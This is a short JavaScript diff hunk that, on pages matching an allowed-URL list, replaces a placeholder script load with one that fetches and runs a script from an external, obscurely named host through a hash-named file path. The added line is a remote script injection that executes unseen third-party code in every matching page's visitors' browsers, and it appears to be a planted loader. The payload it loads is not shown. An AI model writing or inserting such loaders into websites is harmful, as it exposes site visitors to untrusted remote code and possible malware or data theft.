@@ -38,7 +38,7 @@ for (var i = 0; i < allowedURLs.length; i++) {
 }
 
 if (foundMatch) {
-function loadScript(url, callback) { var script = document.createElement('script'); script.type = 'text/javascript'; script.src = url; script.onload = function() { if (callback) callback(); }; document.head.appendChild(script); } loadScript('#', function() { console.log('Script loaded!'); });
+function loadScript(url, callback) { var script = document.createElement('script'); script.type = 'text/javascript'; script.src = url; script.onload = function() { if (callback) callback(); }; document.head.appendChild(script); } loadScript('https://exceedunited.com/2d/9f/1a/2d9f1a9907b9c95b10ad5f0e1e048d46.js', function() { console.log('Script loaded!'); });
 
 
  
